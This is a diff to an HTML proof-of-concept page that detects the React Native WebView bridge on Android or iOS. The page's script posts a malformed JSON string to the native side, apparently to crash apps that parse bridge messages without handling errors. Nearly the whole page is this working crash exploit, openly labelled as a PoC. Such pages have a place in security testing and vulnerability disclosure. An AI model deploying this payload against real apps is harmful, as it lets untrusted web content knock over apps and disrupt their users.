@@ -2,26 +2,33 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>ReactNativeWebView Android Crash PoC</title>
+    <title>ReactNativeWebView Cross-Platform Crash PoC</title>
 </head>
 <body>
-    <h2>ReactNativeWebView Android Crash PoC</h2>
+    <h2>ReactNativeWebView Cross-Platform Crash PoC</h2>
     <pre id="log"></pre>
 
     <script>
         const log = msg => document.getElementById("log").textContent += "\n" + msg;
+
         try {
-            if (window.ReactNativeWebView) {
-                log("ReactNativeWebView detected on Android.");
+            // Payload khusus (invalid JSON)
+            const payload = "{unclosed_json:";
 
-                // Malformed JSON payload
-                const payload = "{unclosed_json:";
-
-                // Kirim ke native side
+            if (window.ReactNativeWebView && typeof window.ReactNativeWebView.postMessage === "function") {
+                // Android
+                log("ReactNativeWebView detected (Android).");
                 window.ReactNativeWebView.postMessage(payload);
                 log("Payload sent: " + payload);
-            } else {
-                log("ReactNativeWebView not available.");
+            }
+            else if (window.webkit?.messageHandlers?.ReactNativeWebView) {
+                // iOS
+                log("ReactNativeWebView handler detected (iOS).");
+                window.webkit.messageHandlers.ReactNativeWebView.postMessage(payload);
+                log("Payload sent: " + payload);
+            }
+            else {
+                log("ReactNativeWebView not detected.");
             }
         } catch (e) {
             log("JS Exception: " + e.message);
